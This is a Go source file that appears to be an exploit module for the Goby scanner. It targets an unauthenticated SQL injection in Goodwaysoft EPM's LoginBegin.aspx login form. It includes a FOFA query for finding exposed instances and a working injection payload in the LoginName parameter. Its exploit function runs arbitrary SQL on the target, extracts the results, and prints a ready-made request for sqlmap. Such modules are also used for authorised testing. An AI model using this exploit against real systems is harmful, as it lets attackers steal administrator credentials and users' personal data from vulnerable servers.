package exploits

import (
	"fmt"
	"net/url"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Goodwaysoft EPM LoginBegin SQL Injection Vulnerability",
    "Description": "<p>Goodwaysoft EPM is a set of comprehensive management solutions tailored for various enterprises by Shanghai Jinhui Software Co., Ltd. based on years of industry system research and development and implementation experience. The system aims to improve the management efficiency of enterprises, optimize resource allocation, and realize office automation and paperless office by means of information technology. </p><p>The Loginbegine.aspx system does not strictly check and filter the input SQL statements and executes them directly into the database. As a result, an unauthenticated remote attacker can take advantage of the SQL injection vulnerability to obtain information in the database, such as administrator background password and site user personal information. Even in the case of high permissions can be written to the server Trojan horse, further access to the server system permissions.</p>",
    "Product": "Goodwaysoft EPM",
    "Homepage": "https://www.goodwaysoft.com/ebook/GW_ZY/",
    "DisclosureDate": "2024-07-26",
    "PostTime": "2024-07-30",
    "Author": "1215816861@qq.com",
    "FofaQuery": "body=\"/Portal/LoginBegin.aspx\" && body=\"MiniCssInc.js\"",
    "GobyQuery": "body=\"/Portal/LoginBegin.aspx\" && body=\"MiniCssInc.js\"",
    "Level": "2",
    "Impact": "<p>The Loginbegine.aspx system does not strictly check and filter the input SQL statements and executes them directly into the database. As a result, an unauthenticated remote attacker can take advantage of the SQL injection vulnerability to obtain information in the database, such as administrator background password and site user personal information. Even in the case of high permissions can be written to the server Trojan horse, further access to the server system permissions.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer'shomepage update:<a href=\"https://www.goodwaysoft.com/ebook/GW_ZY/\">https://www.goodwaysoft.com/ebook/GW_ZY/</a></p><p>2. Deploy a web application firewall to monitor database operations. </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlpoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "(SELECT (CHAR(99)+CHAR(97)+CHAR(110)+CHAR(99)+CHAR(97)+CHAR(110)+CHAR(110)+CHAR(101)+CHAR(101)+CHAR(100)))",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "HW-2024"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.0",
    "Translation": {
        "CN": {
            "Name": "金慧综合管理信息系统 LoginBegin SQL 注入漏洞",
            "Product": "金慧综合管理信息系统",
            "Description": "<p>金慧综合管理信息系统是上海金慧软件有限公司基于多年行业系统研发和实施经验，为各类企业量身定制的一套综合性管理解决方案。该系统旨在通过信息化手段，提升企业的管理效率，优化资源配置，实现办公自动化和无纸化办公。<br></p><p>由于金慧综合管理信息系统LoginBegin.aspx没有对外部输入的SQL语句进行严格的校验和过滤，直接带入数据库执行，导致未经身份验证的远程攻击者可以利用SQL注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"https://www.goodwaysoft.com/ebook/GW_ZY/\">https://www.goodwaysoft.com/ebook/GW_ZY/</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>由于金慧综合管理信息系统LoginBegin.spx没有对外部输入的SQL语句进行严格的校验和过滤，直接带入数据库执 行，导致未经身份验证的远程攻击者可以利用SQL注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之 外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "Goodwaysoft EPM LoginBegin SQL Injection Vulnerability",
            "Product": "Goodwaysoft EPM",
            "Description": "<p>Goodwaysoft EPM is a set of comprehensive management solutions tailored for various enterprises by Shanghai Jinhui Software Co., Ltd. based on years of industry system research and development and implementation experience. The system aims to improve the management efficiency of enterprises, optimize resource allocation, and realize office automation and paperless office by means of information technology.&nbsp;</p><p>The Loginbegine.aspx system does not strictly check and filter the input SQL statements and executes them directly into the database. As a result, an unauthenticated remote attacker can take advantage of the SQL injection vulnerability to obtain information in the database, such as administrator background password and site user personal information. Even in the case of high permissions can be written to the server Trojan horse, further access to the server system permissions.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer'shomepage update:<a href=\"https://www.goodwaysoft.com/ebook/GW_ZY/\">https://www.goodwaysoft.com/ebook/GW_ZY/</a></p><p>2. Deploy a web application firewall to monitor database operations.&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>The Loginbegine.aspx system does not strictly check and filter the input SQL statements and executes them directly into the database. As a result, an unauthenticated remote attacker can take advantage of the SQL injection vulnerability to obtain information in the database, such as administrator background password and site user personal information. Even in the case of high permissions can be written to the server Trojan horse, further access to the server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10980"
}`

	setSqlPayloadHash_h6n3xv5vpsvbbs9GS := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setPostRequest := func(hostInfo *httpclient.FixUrl, urlGet string, data string, head map[string]string) (*httpclient.HttpResponse, error) {
			PostRequest := httpclient.NewPostRequestConfig(urlGet)
			PostRequest.Timeout = 15
			PostRequest.VerifyTls = false
			PostRequest.FollowRedirect = false
			PostRequest.Data = data
			for headName, headValue := range head {
				PostRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, PostRequest)
		}

		urlget := `/Portal/LoginBegin.aspx?ReturnUrl=%2f`
		data := `Todo=Validate&LoginName=1%27+AND+5094+IN+` + url.QueryEscape(sql) + `+AND+%27JKJg%27%3D%27JKJg&Password=&CDomain=Local&FromUrl=`
		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
			"Accept-Language": "zh-CN,zh;q=0.9",
			"Content-Type":    "application/x-www-form-urlencoded",
			"Referer":         hostInfo.FixedHostInfo,
		}
		resp, err = setPostRequest(hostInfo, urlget, data, header)
		if err != nil || resp.StatusCode != 200 {
			return resp, "", err
		}

		//配置漏洞存在的路径
		vulurl = "/Portal/LoginBegin.aspx?ReturnUrl=%2f"

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := "cancanneed"

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := `(SELECT (CHAR(99)+CHAR(97)+CHAR(110)+CHAR(99)+CHAR(97)+CHAR(110)+CHAR(110)+CHAR(101)+CHAR(101)+CHAR(100)))`

			sendPayload := setSqlPayloadHash_h6n3xv5vpsvbbs9GS

			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil || !strings.Contains(resp.RawBody, content) {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {

			// 1.配置sqlpoint，供sqlmap工具使用
			sqlpoint := "POST /Portal/LoginBegin.aspx?ReturnUrl=%2f HTTP/1.1\nHost: " + expResult.HostInfo.HostInfo + "\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25\nContent-Length: 271\nContent-Type: application/x-www-form-urlencoded\n\nTodo=Validate&LoginName=1%27+AND+5094+IN+%28SELECT+%28CHAR%2899%29%2BCHAR%2897%29%2BCHAR%28110%29%2BCHAR%2899%29%2BCHAR%2897%29%2BCHAR%28110%29%2BCHAR%28110%29%2BCHAR%28101%29%2BCHAR%28101%29%2BCHAR%28100%29%29%29+AND+%27JKJg%27%3D%27JKJg&Password=&CDomain=Local&FromUrl="

			// 2.配置正则语句，从响应包中提取出数据
			regular := ` '([\s\S]*?)' `

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}

			sendPayload := setSqlPayloadHash_h6n3xv5vpsvbbs9GS
			attacktype := goutils.B2S(ss.Params["attackType"])

			switch attacktype {

			case "sql":
				sql := goutils.B2S(ss.Params["sql"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `Exploitation failed` + err.Error()
					expResult.Success = false
					return expResult
				}

				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "Exploitation failed "
					return expResult
				}
				expResult.Success = true
				expResult.Output = output

			case "sqlpoint":
				expResult.Success = true
				expResult.Output = sqlpoint

			default:
				expResult.Success = false
				expResult.Output = "Unknown attack type"

			}
			return expResult
		},
	))
}
